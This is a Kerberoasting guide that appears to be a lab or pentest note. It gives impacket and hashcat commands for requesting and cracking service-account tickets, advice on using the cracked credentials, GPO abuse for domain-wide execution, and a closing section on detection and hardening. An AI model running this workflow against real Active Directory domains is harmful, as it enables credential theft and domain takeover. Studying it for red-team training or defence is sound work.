# Kerberoasting

**MITRE ATT&CK:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting

## Overview

Kerberoasting abuses a core Kerberos feature: **any authenticated domain
user can request a service ticket (TGS) for any registered SPN — no
elevated privileges required.** That ticket is encrypted with the *service
account's* password hash, not the requester's. An attacker can request
tickets for every SPN account in the domain, then crack them offline at
leisure with zero further domain interaction and zero lockout risk.

This is especially effective against **service accounts**, notorious for
old, weak, or never-rotated passwords set once at initial configuration and
forgotten.

## Prerequisites

- Valid domain credentials for **any** authenticated user — no elevated
  privileges needed.
- Network reachability to the DC (Kerberos over TCP/UDP 88).
- **Accurate clock sync with the DC.** Kerberos enforces a max clock skew
  (default 5 min) as an anti-replay control; drift causes
  `KRB_AP_ERR_SKEW`.

## Attack Workflow

### 1. Fix clock skew (common blocker — do this first)

```bash
sudo systemctl stop systemd-timesyncd
sudo timedatectl set-ntp false
sudo ntpdate -u <DC_IP>
```

If NTP (123/udp) isn't reachable, sync via SMB/RPC using existing domain creds:

```bash
sudo net rpc time -S <DC_IP> -U '<DOMAIN>\<LOWPRIV_USER>%<LOWPRIV_PASS>'
```

Verify with `date` before proceeding.

### 2. Enumerate SPN accounts and request TGS tickets

```bash
impacket-GetUserSPNs <DOMAIN>/<LOWPRIV_USER>:'<LOWPRIV_PASS>' -dc-ip <DC_IP> -request
```

This does two things in one pass:
- Lists every account with a registered SPN, plus recon data: group
  memberships, password-last-set date, last logon.
- Requests (`-request`) a TGS for each and prints the crackable hash.

**Pay attention to enumeration output before cracking anything** — group
membership on an SPN account is high-value intel. An SPN account sitting in
a privileged group (Domain Admins, Group Policy Creator Owners, Account
Operators, etc.) makes that hash a priority target.

### 3. Save the hash cleanly

```bash
impacket-GetUserSPNs <DOMAIN>/<LOWPRIV_USER>:'<LOWPRIV_PASS>' -dc-ip <DC_IP> -request -outputfile spn.hash
```

### 4. Identify the encryption type before cracking

The hash prefix tells you which hashcat mode to use — the most common
mistake in Kerberoasting guides is assuming RC4:

| Hash prefix | Encryption type | hashcat mode |
|---|---|---|
| `$krb5tgs$23$...` | RC4 (etype 23) | `-m 13100` |
| `$krb5tgs$18$...` | AES256 (etype 18) | `-m 19700` |
| `$krb5tgs$17$...` | AES128 (etype 17) | `-m 19600` |

AES-encrypted tickets are 50–100x slower to crack than RC4 due to the
intentional KDF cost — a domain enforcing AES-only Kerberos will hand out
`$18$` hashes exclusively, closing off the cheap RC4 path.

### 5. Crack offline

```bash
hashcat -m <mode> spn.hash /usr/share/wordlists/rockyou.txt
```

With rules for better hit rate:

```bash
hashcat -m <mode> spn.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

Confirm GPU acceleration:

```bash
hashcat -I
```

### 6. Post-crack — use the recovered credential

Once cracked, treat the service account's plaintext password like any other
compromised credential:
- Authenticate directly (`impacket-wmiexec`, `impacket-psexec`,
  CrackMapExec, etc.)
- Check effective rights via group membership / BloodHound path analysis.
- If it holds **Group Policy Creator Owners**, this opens a GPO-abuse path:
  create/edit a GPO to push a malicious scheduled task or startup script to
  any linked computer/OU — a common route to domain-wide execution or
  Domain Admin.

## Key Notes & Gotchas

- **No lockout risk from the ticket request itself** — it's a normal,
  logged Kerberos operation; cracking happens entirely offline.
- **AS-REP Roasting is the pre-auth-disabled cousin** — if any accounts have
  Kerberos pre-authentication disabled, `impacket-GetNPUsers` pulls a
  crackable hash **without needing valid creds first**. Worth checking
  alongside Kerberoasting.
- **Old `PasswordLastSet` dates on SPN accounts are a strong signal** — an
  account that hasn't rotated in months/years is disproportionately likely
  to be weak or reused.

## Detection & Defensive Notes

- **Windows Event ID 4769** (Kerberos service ticket request) is the
  primary detection point. A single account requesting TGS tickets for many
  different SPNs in a short window is a strong indicator — especially with
  etype `0x17` (RC4), which is unusual on a hardened modern AD environment
  and often signals a downgrade attempt.
- **Enforce AES-only Kerberos** domain-wide (disable RC4).
- **Rotate service account passwords regularly**; use long, random,
  non-human-generated passwords (25+ chars) for any SPN account.
- Where supported, use **Group Managed Service Accounts (gMSAs)** — their
  passwords are long, random, and auto-rotated by AD, effectively immune to
  offline cracking.
- Audit privileged group membership for service accounts — a Kerberoastable
  account in a powerful group multiplies the impact of a successful crack.

## Quick Reference

| Step | Command |
|---|---|
| Fix clock skew | `sudo ntpdate -u <DC_IP>` |
| Enumerate + request tickets | `impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -request -outputfile spn.hash` |
| Identify etype | Check hash prefix: `$18$`=AES256, `$23$`=RC4, `$17$`=AES128 |
| Crack (RC4) | `hashcat -m 13100 spn.hash wordlist.txt` |
| Crack (AES256) | `hashcat -m 19700 spn.hash wordlist.txt` |
| Crack (AES128) | `hashcat -m 19600 spn.hash wordlist.txt` |

---

*Performed against an isolated, self-owned lab domain for training purposes only.*
